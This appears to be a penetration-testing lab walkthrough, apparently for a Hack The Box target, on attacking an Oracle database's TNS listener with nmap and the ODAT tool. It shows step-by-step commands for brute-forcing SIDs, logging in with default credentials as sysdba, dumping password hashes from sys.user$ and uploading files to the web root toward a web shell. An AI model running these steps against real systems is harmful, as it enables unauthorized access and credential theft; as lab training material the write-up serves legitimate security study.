Before we can enumerate the TNS listener and interact with it, we need to download a few packages and tools for our Pwnbox instance in case it does not have these already. Here is a Bash script that does all of that:
```
#!/bin/bash 

sudo apt-get install libaio1 python3-dev alien -y 
git clone https://github.com/quentinhardy/odat.git 
cd odat/ 
git submodule init git submodule update wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip 
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip 
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip 
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH 
export PATH=$LD_LIBRARY_PATH:$PATH 
pip3 install cx_Oracle 
sudo apt-get install python3-scapy -y 
sudo pip3 install colorlog termcolor pycrypto passlib python-libnmap 
sudo pip3 install argcomplete && sudo activate-global-python-argcomplete
```
After that, we can try to determine if the installation was successful by running the following command:
```
./odat.py -h
```
Oracle Database Attacking Tool (ODAT) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.
# Footprinting
nmap to scan the default Oracle TNS listener port
```
sudo nmap -p1521 -sV 10.129.204.235 --open
```
```
Service oracle-tns
```
```
Version Oracle TNS listenener
```
We can see that the port is open, and the service is running

In Oracle RDBMS, a System Identifier (SID) is a unique name that identifies a particular database instance. It can have multiple instances, each with its own System ID. An instance is a set of processes and memory structures that interact to manage the database's data. When a client connects to an Oracle database, it specifies the database's SID along with its connection string. The client uses this SID to identify which database instance it wants to connect to. Suppose the client does not specify a SID. Then, the default value defined in the tnsnames.ora file is used.

The SIDs are an essential part of the connection process, as it identifies the specific instance of the database the client wants to connect to. If the client specifies an incorrect SID, the connection attempt will fail. Database administrators can use the SID to monitor and manage the individual instances of a database. For example, they can start, stop, or restart an instance, adjust its memory allocation or other configuration parameters, and monitor its performance using tools like Oracle Enterprise Manager.
There are various ways to enumerate, or better said, guess SIDs. Therefore we can use tools like `nmap, hydra, odat`, and others. Let us use `nmap` first.
## nmap - SID Bruteforcing
```
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```
## odat
use the odat.py tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components.
```
./odat.py all -s 10.129.204.235
```
**In this example, we found valid credentials for the user scott and his password tiger. After that, we can use the tool sqlplus to connect to the Oracle database and interact with it**: 
### SQLplus
```
sqlplus scott/tiger@10.129.204.235/XE
```
### Oracle RDBMS - Interaction
```
SQL> select * from user_role_privs;
```
Here, the user scott has no administrative privileges. However, we can try using this account to log in as the System Database Admin (sysdba), giving us higher privileges. This is possible when the user scott has the appropriate privileges typically granted by the database administrator or used by the administrator him/herself.
```
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```
From this point, we could retrieve the password hashes from the sys.user$ and try to crack them offline. The query for this would look like the following:
```
SQL> select name, password from sys.user$;
```
If you come across the following error sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory, please execute the below, taken from here.
```
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```
## Webshell
Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:
- OS Path
- Linux /var/www/html
- Windows C:\inetpub\wwwroot
First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important. Therefore, we create a text file with a string and use it to upload to the target system.
### Oracle RDBMS - File Upload
```
echo "Oracle File Upload Test" > testing.txt
```
```
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```
Test the uploaded file
```
curl -X GET http://ip/testing.txt
```
https://benheater.com/hackthebox-silo/